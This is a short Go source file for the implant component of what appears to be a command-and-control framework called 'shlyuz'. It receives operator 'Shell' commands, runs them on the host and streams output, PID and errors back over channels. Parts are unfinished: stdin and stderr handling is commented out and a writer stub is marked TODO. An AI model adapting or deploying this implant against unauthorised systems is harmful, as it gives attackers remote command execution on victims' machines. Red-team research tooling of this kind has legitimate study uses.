//go:build implant && (!lp || !teamserver)

package fire

import (
	"bufio"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings"
)

func ExecuteCmd(cmd component.Command, execChannels *component.ComponentExecutionChannel) {
	if cmd.Type == "Shell" {
		cmdSlice := strings.Split(cmd.Args, " ")
		command := exec.Command(cmdSlice[0], cmdSlice[1:]...)

		cmdOutReader, _ := command.StdoutPipe()
		// cmdErrReader, _ := command.StderrPipe()
		// cmdInReader, _ := command.StdinPipe()

		outScanner := bufio.NewScanner(cmdOutReader)
		go reader(outScanner, execChannels.StdOut)

		go func() {
			value := <-execChannels.StdOut
			println(value)
			execChannels.Pid <- command.Process.Pid
		}()

		err := command.Run()
		if err != nil {
			log.Println("encountered error while executing ", execChannels.CmdId)
			execChannels.StdErr <- err.Error()
		}
	}

}

func reader(scanner *bufio.Scanner, out chan string) {
	for scanner.Scan() {
		out <- scanner.Text()
	}
}

func writer(scanner *bufio.Scanner, in chan string) {
	for scanner.Scan() {
		<-in // TODO: what do here?
	}
}
